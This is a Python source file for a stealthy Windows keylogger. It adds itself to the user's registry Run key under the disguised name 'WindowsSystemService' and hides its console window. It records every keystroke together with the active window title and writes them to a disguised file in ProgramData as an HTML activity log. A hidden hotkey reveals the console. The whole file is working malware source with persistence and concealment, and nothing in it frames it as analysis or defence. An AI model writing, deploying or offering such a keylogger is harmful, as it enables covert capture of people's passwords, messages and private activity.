import os
import threading
import pynput.keyboard as keyboard
import time
import winreg
import win32console
import win32gui
from datetime import datetime
from collections import defaultdict

BASE_DIR = "C:\\ProgramData\\SystemLogs"
os.makedirs(BASE_DIR, exist_ok=True)
log_path = os.path.join(BASE_DIR, "sys_cache.dat")
current_date = datetime.now().strftime("%Y-%m-%d")

def add_to_startup():
    script_path = os.path.abspath(__file__)
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        key_handle = winreg.OpenKey(reg, key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key_handle, "WindowsSystemService", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key_handle)
    except:
        pass

add_to_startup()

if not os.path.exists(log_path):
    with open(log_path, "w") as file:
        file.write(f"""
        <html>
        <head>
            <title>Activity Log</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Share+Tech+Mono&display=swap');
                
                body {{ font-family: 'Orbitron', sans-serif; background: #0d0d0d; color: #ffffff; padding: 20px; display: flex; flex-direction: column; align-items: center; }}
                .container {{ width: 90%; max-width: 900px; background: #1b1b1b; padding: 20px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0, 255, 255, 0.2); animation: fadeIn 0.8s ease-in-out; overflow: hidden; }}
                @keyframes fadeIn {{ from {{ opacity: 0; transform: translateY(-20px); }} to {{ opacity: 1; transform: translateY(0); }} }}
                h2 {{ text-align: center; font-weight: 600; margin-bottom: 20px; text-transform: uppercase; color: #00ffff; }}
                .entry {{ background: linear-gradient(135deg, #232526, #414345); padding: 12px; border-radius: 6px; margin-bottom: 10px; transition: transform 0.3s ease-in-out, box-shadow 0.3s; opacity: 0; animation: fadeIn 0.6s ease-in-out forwards; }}
                .entry:hover {{ transform: scale(1.03); box-shadow: 0 5px 10px rgba(0, 255, 255, 0.3); }}
                .timestamp {{ font-size: 14px; font-weight: bold; color: #ffcc00; }}
                .app {{ font-size: 16px; font-weight: bold; color: #4caf50; text-transform: uppercase; }}
                .key {{ font-size: 15px; font-family: 'Share Tech Mono', monospace; color: #d1d1d1; word-wrap: break-word; }}
            </style>
        </head>
        <body>
        <div class='container'>
        <h2>Activity Log - {current_date}</h2>
        """)

def get_active_window():
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown"

logging_enabled = True
keystroke_buffer = defaultdict(str)
last_log_time = defaultdict(lambda: time.time())
current_keys = set()

def log_keystroke(key):
    global logging_enabled
    if not logging_enabled:
        return
    
    try:
        key = key.char if hasattr(key, 'char') and key.char is not None else str(key)
    except AttributeError:
        key = str(key)
    
    key_mappings = {
    "Key.space": " ", "Key.enter": "\n", "Key.backspace": " [Backspace] ",
    "Key.tab": " [Tab] ", "Key.esc": " [Esc] ", "Key.delete": " [Delete] ",
    "Key.up": " [Up] ", "Key.down": " [Down] ", "Key.left": " [Left] ", "Key.right": " [Right] ",
    "Key.alt_l": "[ALT]", "Key.ctrl_l": "[LeftCTRL]", "Key.shift": "[Shift]",
    "Key.caps_lock": " [Caps] "  # This ensures Caps Lock appears formatted correctly
}

    
    key = key_mappings.get(key, key)
    active_window = get_active_window()
    timestamp = datetime.now().strftime("%I:%M:%S %p")
    
    if key.startswith("["):
        current_keys.add(key)
    else:
        if current_keys:
            key = " + ".join(sorted(current_keys)) + " + " + key
            current_keys.clear()
    
    keystroke_buffer[active_window] += key
    last_log_time[active_window] = time.time()

def flush_logs():
    while True:
        time.sleep(5)
        for app, text in keystroke_buffer.items():
            if text.strip():
                timestamp = datetime.now().strftime("%I:%M:%S %p")
                with open(log_path, "a", encoding="utf-8") as file:
                    file.write(f"""
                    <div class='entry'>
                        <div class='timestamp'>{timestamp}</div>
                        <div class='app'>{app}</div>
                        <div class='key'>{text}</div>
                    </div>
                    """)
                    file.flush()
                keystroke_buffer[app] = ""

def start_logging():
    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()

def hide_console():
    try:
        window = win32console.GetConsoleWindow()
        if window:
            win32gui.ShowWindow(window, 0)
    except:
        pass

hide_console()

def command_listener():
    global logging_enabled
    while True:
        command = input("Enter command: ")
        if command.lower() == "stop":
            logging_enabled = False
        elif command.lower() == "start":
            logging_enabled = True

def toggle_console():
    try:
        window = win32console.GetConsoleWindow()
        if win32gui.IsWindowVisible(window):
            win32gui.ShowWindow(window, 0)
        else:
            win32gui.ShowWindow(window, 1)
    except:
        pass

t = threading.Thread(target=start_logging, daemon=True)
t.start()
log_flush_thread = threading.Thread(target=flush_logs, daemon=True)
log_flush_thread.start()
cmd_thread = threading.Thread(target=command_listener, daemon=True)
cmd_thread.start()

with keyboard.GlobalHotKeys({"<ctrl>+<shift>+o": toggle_console}):
    while True:
        time.sleep(10)